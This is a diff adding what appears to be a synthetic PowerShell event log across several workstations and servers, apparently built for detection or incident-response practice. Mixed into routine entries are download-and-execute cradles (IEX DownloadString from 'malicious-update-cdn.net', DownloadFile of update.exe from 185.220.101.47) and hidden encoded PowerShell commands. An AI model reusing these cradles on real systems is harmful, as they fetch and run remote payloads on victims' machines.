@@ -1,0 +1,100 @@
+2026-06-15 00:08:00 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: dwilson
+2026-06-15 00:11:14 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 00:17:43 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 00:20:19 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 00:25:24 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 00:30:50 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 00:32:25 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: amehta
+2026-06-15 00:33:44 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 00:38:33 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: amehta
+2026-06-15 00:45:05 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: kpatel
+2026-06-15 00:49:38 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: nreddy
+2026-06-15 00:54:42 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 00:57:52 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: dwilson
+2026-06-15 00:59:15 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Restart-Service): "Restart-Service" ParameterBinding(Restart-Service): name="Name"; value="Spooler" User: rgupta
+2026-06-15 01:04:54 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 01:07:20 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: jsmith
+2026-06-15 01:13:58 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 01:17:26 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: jsmith
+2026-06-15 01:24:03 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: nreddy
+2026-06-15 01:30:32 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 01:36:32 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: amehta
+2026-06-15 01:41:45 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 01:44:09 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: nreddy
+2026-06-15 01:48:37 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 01:51:24 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: lchen
+2026-06-15 01:56:48 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: amehta
+2026-06-15 01:57:45 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Start-Process): "Start-Process" ParameterBinding(Start-Process): name="WindowStyle"; value="Hidden" User: rgupta
+2026-06-15 02:02:10 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: rgupta
+2026-06-15 02:07:56 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1') User: rgupta
+2026-06-15 02:12:10 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 02:16:54 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: nreddy
+2026-06-15 02:22:26 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs... User: tverma
+2026-06-15 02:26:39 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Start-Process): "Start-Process" ParameterBinding(Start-Process): name="WindowStyle"; value="Hidden" User: kpatel
+2026-06-15 02:27:42 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 02:29:39 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 02:30:20 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 02:35:36 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: amehta
+2026-06-15 02:39:55 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 02:45:11 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 02:51:13 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Restart-Service): "Restart-Service" ParameterBinding(Restart-Service): name="Name"; value="Spooler" User: dwilson
+2026-06-15 02:52:12 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 02:55:39 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\svc_backup\AppData\Local\Temp\update.exe') User: svc_backup
+2026-06-15 03:00:13 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: tverma
+2026-06-15 03:06:44 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 03:08:29 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 03:09:31 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: lchen
+2026-06-15 03:15:50 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 03:19:21 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 03:20:24 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: dwilson
+2026-06-15 03:27:02 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 03:29:53 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs... User: nreddy
+2026-06-15 03:35:14 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 03:37:53 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Restart-Service): "Restart-Service" ParameterBinding(Restart-Service): name="Name"; value="Spooler" User: dwilson
+2026-06-15 03:38:37 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: nreddy
+2026-06-15 03:45:12 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: tverma
+2026-06-15 03:50:48 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 03:55:29 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: tverma
+2026-06-15 03:59:39 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 04:06:09 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 04:07:47 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_sql
+2026-06-15 04:11:39 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: lchen
+2026-06-15 04:13:59 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 04:20:07 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\svc_backup\AppData\Local\Temp\update.exe') User: svc_backup
+2026-06-15 04:24:28 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: svc_sql
+2026-06-15 04:27:36 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs... User: svc_sql
+2026-06-15 04:32:41 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Restart-Service): "Restart-Service" ParameterBinding(Restart-Service): name="Name"; value="Spooler" User: tverma
+2026-06-15 04:39:07 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: nreddy
+2026-06-15 04:45:22 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: kpatel
+2026-06-15 04:48:27 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs... User: kpatel
+2026-06-15 04:51:46 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1') User: jsmith
+2026-06-15 04:54:15 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: kpatel
+2026-06-15 04:59:36 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): IEX (New-Object Net.WebClient).DownloadString('http://malicious-update-cdn.net/stage2.ps1') User: nreddy
+2026-06-15 05:04:26 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): powershell.exe -NoP -NonI -W Hidden -Enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBs... User: dwilson
+2026-06-15 05:08:24 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: jsmith
+2026-06-15 05:10:07 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\kpatel\AppData\Local\Temp\update.exe') User: kpatel
+2026-06-15 05:15:13 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 05:21:31 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: jsmith
+2026-06-15 05:27:01 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 05:30:12 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: tverma
+2026-06-15 05:30:45 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 05:36:27 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: dwilson
+2026-06-15 05:37:24 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: jsmith
+2026-06-15 05:43:58 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: amehta
+2026-06-15 05:47:31 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 05:53:01 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: dwilson
+2026-06-15 05:54:32 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 05:55:38 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 06:01:22 SRV-DC01 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: nreddy
+2026-06-15 06:02:24 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): (New-Object System.Net.WebClient).DownloadFile('http://185.220.101.47/update.exe','C:\Users\jsmith\AppData\Local\Temp\update.exe') User: jsmith
+2026-06-15 06:07:25 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: amehta
+2026-06-15 06:11:26 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: jsmith
+2026-06-15 06:13:18 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Restart-Service): "Restart-Service" ParameterBinding(Restart-Service): name="Name"; value="Spooler" User: dwilson
+2026-06-15 06:15:27 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 06:18:04 SRV-APP05 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: lchen
+2026-06-15 06:23:41 WKS-ENG14 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: svc_backup
+2026-06-15 06:25:42 WKS-FIN07 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: rgupta
+2026-06-15 06:27:44 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4103 CommandInvocation(Get-Service): "Get-Service" ParameterBinding(Get-Service): name="Name"; value="wuauserv" User: nreddy
+2026-06-15 06:28:29 WKS-HR03 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: nreddy
+2026-06-15 06:34:31 SRV-FILE02 Microsoft-Windows-PowerShell/Operational 4100 Engine state is changed from Available to Stopped. Engine Host: ConsoleHost User: kpatel
+2026-06-15 06:39:14 WKS-SALES22 Microsoft-Windows-PowerShell/Operational 4104 Creating Scriptblock text (1 of 1): Get-ADUser -Filter * -Properties LastLogonDate | Export-Csv C:\Reports\adusers.csv User: nreddy
